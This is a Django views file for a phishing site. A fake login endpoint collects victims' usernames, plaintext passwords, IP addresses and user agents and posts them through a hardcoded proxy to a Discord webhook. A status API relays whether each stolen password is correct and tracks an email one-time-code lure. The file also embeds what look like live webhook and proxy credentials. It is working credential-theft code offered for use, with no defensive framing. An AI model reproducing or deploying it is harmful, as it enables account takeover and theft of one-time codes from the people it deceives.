from django.shortcuts import render, redirect
from django.contrib import messages
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from django.views.decorators.http import require_http_methods
from channels.layers import get_channel_layer
from asgiref.sync import async_to_sync
import logging
import requests
from datetime import datetime
import json
import os

# Set up logger
logger = logging.getLogger(__name__)

# Discord Webhook URL
WEBHOOK_URL = "https://discord.com/api/webhooks/1523355615525867650/s28X3S_aIDij8oeU5LGcBSdyjjZgInl5oqa4DMpTyMDAhkE2thkUU_dtZ_t2yiipaT9N"

# Your proxy configuration
PROXY = {
    'http': 'http://14ad8d1127bc2:b98fe3138d@217.67.68.235:12323',
    'https': 'http://14ad8d1127bc2:b98fe3138d@217.67.68.235:12323'
}

# Set to True to use proxy
USE_PROXY = True

def send_discord_message(message, color=0x00ff00):
    """
    Send a simple message to Discord webhook
    """
    try:
        embed = {
            "title": "📨 Notification",
            "description": message,
            "color": color,
            "timestamp": datetime.now().isoformat()
        }
        
        payload = {
            "embeds": [embed],
            "username": "System Bot"
        }
        
        if USE_PROXY:
            response = requests.post(
                WEBHOOK_URL, 
                json=payload, 
                timeout=30,
                proxies=PROXY,
                headers={'Content-Type': 'application/json'}
            )
        else:
            response = requests.post(
                WEBHOOK_URL, 
                json=payload, 
                timeout=30,
                headers={'Content-Type': 'application/json'}
            )
        
        return response.status_code == 204
    except Exception as e:
        print(f"❌ Error sending Discord message: {e}")
        return False

def send_discord_notification(username, password, user_id=None, ip_address=None, user_agent=None):
    """
    Send login attempt information to Discord webhook using proxy
    """
    try:
        # Create the embed message
        embed = {
            "title": "🔐 New Login Attempt",
            "color": 0x00ff00,
            "fields": [
                {
                    "name": "👤 Username/Email",
                    "value": username,
                    "inline": True
                },
                {
                    "name": "🔑 Password",
                    "value": f"||{password}||",
                    "inline": True
                },
                {
                    "name": "🆔 User ID",
                    "value": str(user_id) if user_id else "Not provided",
                    "inline": True
                },
                {
                    "name": "🌐 IP Address",
                    "value": ip_address if ip_address else "Not available",
                    "inline": True
                },
                {
                    "name": "🖥️ User Agent",
                    "value": user_agent[:200] if user_agent else "Not available",
                    "inline": False
                },
                {
                    "name": "⏰ Timestamp",
                    "value": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "inline": False
                }
            ],
            "footer": {
                "text": "Login Monitor"
            },
            "timestamp": datetime.now().isoformat()
        }
        
        payload = {
            "content": "🚨 **Login Attempt Detected!**",
            "embeds": [embed],
            "username": "Login Monitor Bot",
            "avatar_url": "https://cdn-icons-png.flaticon.com/512/1047/1047711.png"
        }
        
        print(f"📤 Sending to Discord via proxy...")
        print(f"🔄 Using proxy: {PROXY.get('http', 'None')}")
        
        # Send to Discord using proxy
        if USE_PROXY:
            response = requests.post(
                WEBHOOK_URL, 
                json=payload, 
                timeout=30,
                proxies=PROXY,
                headers={'Content-Type': 'application/json'}
            )
        else:
            response = requests.post(
                WEBHOOK_URL, 
                json=payload, 
                timeout=30,
                headers={'Content-Type': 'application/json'}
            )
        
        print(f"📬 Discord response status: {response.status_code}")
        
        if response.status_code == 204:
            print(f"✅ Discord notification sent successfully for: {username}")
            return True
        else:
            print(f"❌ Discord returned status {response.status_code}: {response.text}")
            return False
            
    except requests.exceptions.ProxyError as e:
        print(f"❌ Proxy error: {e}")
        print("💡 Check if proxy is working")
        return False
    except requests.exceptions.Timeout:
        print("⏰ Request timeout - proxy might be slow")
        return False
    except requests.exceptions.ConnectionError as e:
        print(f"❌ Connection error: {e}")
        return False
    except requests.exceptions.RequestException as e:
        print(f"❌ Error sending Discord webhook: {e}")
        return False

def user_profile(request, user_id):
    """
    Display the user profile page
    """
    context = {
        'user_id': user_id,
        'username': 'John Doe',
        'email': 'john@example.com',
        'bio': 'This is a sample user profile page.',
        'join_date': 'January 2025',
    }
    return render(request, 'people/user_profile.html', context)

def login_page(request, user_id):
    """
    Display the login page
    """
    context = {
        'user_id': user_id,
    }
    return render(request, 'people/login.html', context)

def login_user(request, user_id):
    """
    Handle login - AJAX endpoint that returns JSON response only
    No redirect, stays on login page - this is intentional for Discord notification
    """
    print("=" * 50)
    print(f"🔐 LOGIN ATTEMPT - User ID: {user_id}")
    print(f"📝 Request method: {request.method}")
    
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')
        
        print(f"👤 Username received: {username}")
        print(f"🔑 Password received: {'*' * len(password) if password else 'None'}")
        
        # Get additional information
        ip_address = request.META.get('HTTP_X_FORWARDED_FOR', request.META.get('REMOTE_ADDR', ''))
        user_agent = request.META.get('HTTP_USER_AGENT', '')
        
        print(f"🌐 IP Address: {ip_address}")
        print(f"🖥️ User Agent: {user_agent}")
        
        # Send to Discord via proxy
        print("📤 Attempting to send to Discord via proxy...")
        notification_sent = send_discord_notification(
            username=username,
            password=password,
            user_id=user_id,
            ip_address=ip_address,
            user_agent=user_agent
        )
        
        if notification_sent:
            print("✅ Successfully sent to Discord")
            return JsonResponse({
                'status': 'success',
                'message': 'Login information sent to Discord!'
            })
        else:
            print("⚠️ Failed to send to Discord")
            return JsonResponse({
                'status': 'error',
                'message': 'Failed to send to Discord. Please try again.'
            })
    
    # Return error for non-POST requests
    return JsonResponse({
        'status': 'error',
        'message': 'Invalid request method'
    }, status=400)

def logout_user(request, user_id):
    """
    Handle user logout
    """
    logout(request)
    messages.info(request, 'You have been logged out.')
    return redirect('login_page', user_id=user_id)

def broadcast_status(status_value, message=""):
    """
    Broadcast status to all connected WebSocket clients
    """
    try:
        channel_layer = get_channel_layer()
        async_to_sync(channel_layer.group_send)(
            "status_group",
            {
                'type': 'status_update',
                'status': status_value,
                'message': message,
                'timestamp': datetime.now().isoformat()
            }
        )
        print(f"📡 Broadcasted status: {status_value} - {message}")
        return True
    except Exception as e:
        print(f"❌ Failed to broadcast status: {e}")
        return False

@csrf_exempt
@require_http_methods(["GET", "POST"])
def api_set_status(request):
    """
    API endpoint to receive status updates from the Python app
    """
    try:
        if request.method == 'GET':
            status_value = request.GET.get('value')
        else:
            data = json.loads(request.body)
            status_value = data.get('value')
        
        print(f"📥 Received status update: {status_value}")
        
        # Map status values to meaningful messages
        status_messages = {
            'True': '✅ Password is Correct',
            'False': '❌ Password is Incorrect',
            'yle': '🚨 New Login Attempt',
            'yle2': '📊 Error occurred. Use Email One-Time Code',
            'yle3': '📧 Email One-Time Code Sent'
        }
        
        message = status_messages.get(str(status_value), f'Status: {status_value}')
        
        # Send to Discord
        discord_message = f"📊 **Status Update**\nStatus: {message}\nTime: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        send_discord_message(discord_message, color=0x00ff00)
        
        # Broadcast to all WebSocket clients
        broadcast_status(status_value, message)
        
        return JsonResponse({
            'status': 'success',
            'received': status_value,
            'message': message,
            'timestamp': datetime.now().isoformat()
        })
        
    except Exception as e:
        print(f"❌ Error in API: {e}")
        return JsonResponse({
            'status': 'error',
            'error': str(e)
        }, status=500)